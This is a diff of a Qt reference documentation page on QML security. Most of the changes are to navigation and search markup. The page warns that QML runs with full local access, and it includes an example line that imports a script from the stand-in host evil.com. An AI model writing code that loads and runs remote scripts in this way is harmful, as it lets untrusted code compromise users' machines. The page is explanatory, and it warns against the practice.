@@ -15,6 +15,7 @@
     <div id="nav-logo">
       <a href="index.html">Home</a></div>
     <a href="index.html" class="qtref"><span>Qt Reference Documentation</span></a>
+    <div id="narrowsearch"></div>
     <div id="nav-topright">
       <ul>
         <li class="nav-topright-home"><a href="http://qt.nokia.com/">Qt HOME</a></li>
@@ -31,37 +32,37 @@
         <li class="shortCut-topleft-active"><a href="http://doc.qt.nokia.com">ALL VERSIONS        </a></li>
       </ul>
      </div>
- <ul class="sf-menu sf-js-enabled sf-shadow" id="narrowmenu"> 
-		 <li><a href="#">API Lookup</a> 
-			 <ul id="topmenuLook"> 
-			   <li><a href="classes.html">Class index</a></li> 
- 			  <li><a href="functions.html">Function index</a></li> 
-			   <li><a href="modules.html">Modules</a></li> 
-			   <li><a href="namespaces.html">Namespaces</a></li> 
-			   <li><a href="qtglobal.html">Global Declarations</a></li> 
-			   <li><a href="licensing.html">Licenses and Credits</a></li> 
-			   </ul> 
-		 </li> 
-		 <li><a href="#">Qt Topics</a> 
-			 <ul id="topmenuTopic"> 
-			   <li><a href="qt-basic-concepts.html">Programming with Qt</a></li> 
-			   <li><a href="qtquick.html">Device UI's &amp; Qt Quick</a></li> 
-			   <li><a href="qt-gui-concepts.html">UI Design with Qt</a></li> 
-			   <li><a href="developing-with-qt.html">Cross-platform and Platform-specific</a></li> 
-			   <li><a href="platform-specific.html">Platform-specific info</a></li> 
-			   <li><a href="technology-apis.html">Qt and Key Technologies</a></li> 
-			   <li><a href="best-practices.html">How-To's and Best Practices</a></li> 
-			 </ul> 
-		</li> 
-		 <li><a href="#">Examples</a> 
-			 <ul id="topmenuexample"> 
-				 <li><a href="all-examples.html">Examples</a></li> 
-				 <li><a href="tutorials.html">Tutorials</a></li> 
-				 <li><a href="demos.html">Demos</a></li> 
-				 <li><a href="qdeclarativeexamples.html">QML Examples</a></li> 
-			 </ul> 
-		 </li> 
- </ul> 
+ <ul class="sf-menu" id="narrowmenu"> 
+ 			<li><a href="#">API Lookup</a> 
+ 				<ul> 
+ 					<li><a href="classes.html">Class index</a></li> 
+           <li><a href="functions.html">Function index</a></li> 
+           <li><a href="modules.html">Modules</a></li> 
+           <li><a href="namespaces.html">Namespaces</a></li> 
+           <li><a href="qtglobal.html">Global Declarations</a></li> 
+           <li><a href="qdeclarativeelements.html">QML elements</a></li> 
+ 		    </ul> 
+ 			</li> 
+ 			<li><a href="#">Qt Topics</a> 
+ 				<ul> 
+ 					   <li><a href="qt-basic-concepts.html">Programming with Qt</a></li>  
+ 					   <li><a href="qtquick.html">Device UIs &amp; Qt Quick</a></li>  
+ 					   <li><a href="qt-gui-concepts.html">UI Design with Qt</a></li>  
+ 					   <li><a href="developing-with-qt.html">Cross-platform and Platform-specific</a></li>  
+ 					   <li><a href="platform-specific.html">Platform-specific info</a></li>  
+ 					   <li><a href="technology-apis.html">Qt and Key Technologies</a></li>  
+ 					   <li><a href="best-practices.html">How-To's and Best Practices</a></li>  
+ 		     </ul> 
+ 				</li> 
+ 				<li><a href="#">Examples</a> 
+ 					<ul> 
+ 		              <li><a href="all-examples.html">Examples</a></li> 
+ 		              <li><a href="tutorials.html">Tutorials</a></li> 
+ 		              <li><a href="demos.html">Demos</a></li> 
+ 		              <li><a href="qdeclarativeexamples.html">QML Examples</a></li> 
+ 		       </ul> 
+ 					</li> 
+ 				</ul> 
     </div>
   </div>
   <div class="wrapper">
@@ -72,10 +73,17 @@
       <div class="sidebar">
         <div class="searchlabel">
           Search index:</div>
-        <div class="search">
+        <div class="search" id="sidebarsearch">
           <form id="qtdocsearch" action="" onsubmit="return false;">
             <fieldset>
               <input type="text" name="searchstring" id="pageType" value="" />
+ <div id="resultdialog"> 
+ <a href="#" id="resultclose">Close</a> 
+<!-- <p id="resultlinks" class="all"><a href="#" id="showallresults">All</a> | <a href="#" id="showapiresults">API</a> | <a href="#" id="showarticleresults">Articles</a> | <a href="#" id="showexampleresults">Examples</a></p> 
+ <p id="searchcount" class="all"><span id="resultcount"></span><span id="apicount"></span><span id="articlecount"></span><span id="examplecount"></span>&nbsp;results:</p> --> 
+ <ul id="resultlist" class="all"> 
+ </ul> 
+ </div> 
             </fieldset>
           </form>
         </div>
@@ -99,7 +107,7 @@
           <div id="list002" class="list">
             <ul id="ul002" >
 			   <li class="defaultLink"><a href="qt-basic-concepts.html">Programming with Qt</a></li> 
-			   <li class="defaultLink"><a href="qtquick.html">Device UI's &amp; Qt Quick</a></li> 
+			   <li class="defaultLink"><a href="qtquick.html">Device UIs &amp; Qt Quick</a></li> 
 			   <li class="defaultLink"><a href="qt-gui-concepts.html">UI Design with Qt</a></li> 
 			   <li class="defaultLink"><a href="developing-with-qt.html">Cross-platform and Platform-specific</a></li> 
 			   <li class="defaultLink"><a href="platform-specific.html">Platform-specific info</a></li> 
@@ -139,7 +147,7 @@
             </ul>
         </div>
         </div>
-        <div class="content">
+        <div class="content mainContent">
 <div class="toc">
 <h3><a name="toc">Contents</a></h3>
 <ul>
@@ -153,15 +161,15 @@
 <a name="qml-security"></a>
 <h2>QML Security</h2>
 <p>The QML security model is that QML content is a chain of trusted content: the user installs QML content that they trust in the same way as they install native Qt applications, or programs written with runtimes such as Python and Perl. That trust is establish by any of a number of mechanisms, including the availability of package signing on some platforms.</p>
-<p>In order to preserve the trust of users, developers producing QML content should not execute arbitrary downloaded <a href="https://developer.mozilla.org/en/JavaScript">JavaScript</a>, nor instantiate arbitrary downloaded QML elements.</p>
+<p>In order to preserve the trust of users, developers producing QML content should not execute arbitrary downloaded JavaScript, nor instantiate arbitrary downloaded QML elements.</p>
 <p>For example, this QML content:</p>
 <pre class="highlightedCode brush: cpp"> import &quot;http://evil.com/evil.js&quot; as Evil
  ... Evil.doEvil() ...</pre>
-<p>is equivalent to downloading &quot;http://evil.com/evil.exe&quot; and running it. The <a href="https://developer.mozilla.org/en/JavaScript">JavaScript</a> execution environment of QML does not try to stop any particular accesses, including local file system access, just as for any native Qt application, so the &quot;doEvil&quot; function could do the same things as a native Qt application, a Python application, a Perl script, ec.</p>
+<p>is equivalent to downloading &quot;http://evil.com/evil.exe&quot; and running it. The JavaScript execution environment of QML does not try to stop any particular accesses, including local file system access, just as for any native Qt application, so the &quot;doEvil&quot; function could do the same things as a native Qt application, a Python application, a Perl script, etc.</p>
 <p>As with any application accessing other content beyond it's control, a QML application should perform appropriate checks on untrusted data it loads.</p>
 <p>A non-exhaustive list of the ways you could shoot yourself in the foot is:</p>
 <ul>
-<li>Using <tt>import</tt> to import QML or <a href="https://developer.mozilla.org/en/JavaScript">JavaScript</a> you do not control. BAD</li>
+<li>Using <tt>import</tt> to import QML or JavaScript you do not control. BAD</li>
 <li>Using <a href="qml-loader.html">Loader</a> to import QML you do not control. BAD</li>
 <li>Using <a href="qdeclarativeglobalobject.html#xmlhttprequest">XMLHttpRequest</a> to load data you do not control and executing it. BAD</li>
 </ul>
@@ -171,7 +179,7 @@
 <li>Use <a href="qml-xmllistmodel.html">XmlListModel</a> to present online content. GOOD</li>
 <li>Use <a href="qdeclarativeglobalobject.html#xmlhttprequest">XMLHttpRequest</a> to interact with online services. GOOD</li>
 </ul>
-<p>The only reason this page is necessary at all is that <a href="https://developer.mozilla.org/en/JavaScript">JavaScript</a>, when run in a <i>web browser</i>, has quite many restrictions. With QML, you should neither rely on similar restrictions, nor worry about working around them.</p>
+<p>The only reason this page is necessary at all is that JavaScript, when run in a <i>web browser</i>, has quite many restrictions. With QML, you should neither rely on similar restrictions, nor worry about working around them.</p>
 </div>
 <!-- @@@qdeclarativesecurity.html -->
         <div class="feedback t_button">
